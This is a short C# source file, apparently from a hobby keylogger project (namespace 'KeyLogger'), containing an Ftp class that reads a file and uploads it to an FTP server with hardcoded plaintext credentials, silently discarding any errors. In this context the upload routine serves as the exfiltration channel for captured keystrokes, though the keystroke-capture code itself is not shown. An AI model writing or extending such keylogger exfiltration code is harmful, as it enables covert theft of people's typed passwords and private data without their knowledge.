using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Net;
using System.Text;
using System.Threading.Tasks;
using Renci.SshNet;

namespace KeyLogger
{
    public static class Ftp
    {
        static string host = "ftp://127.0.0.1:14147/myFile.txt";
        static string UserId = "Mohammad";
        static string Password = "1234";

        public static void uploadFileToFtpServer(string filePath)
        {
            FtpWebRequest ftpRequest = (FtpWebRequest)WebRequest.Create(host);
            ftpRequest.Credentials = new NetworkCredential(UserId, Password);
            ftpRequest.Method = WebRequestMethods.Ftp.UploadFile;
            ftpRequest.KeepAlive = false;

            try
            {
                byte[] fileContent;  //in this array you'll store the file's content

                using (StreamReader sr = new StreamReader(filePath))  //'myFile.txt' is the file we want to upload
                {
                    fileContent = Encoding.UTF8.GetBytes(sr.ReadToEnd()); //getting the file's content, already transformed into a byte array
                }

                using (Stream sw = ftpRequest.GetRequestStream())
                {
                    sw.Write(fileContent, 0, fileContent.Length);  //sending the content to the FTP Server
                }

                ftpRequest.GetResponse();

            }
            catch (Exception ex)
            {
                //IsCreated = false;
            }
        }

    }

}
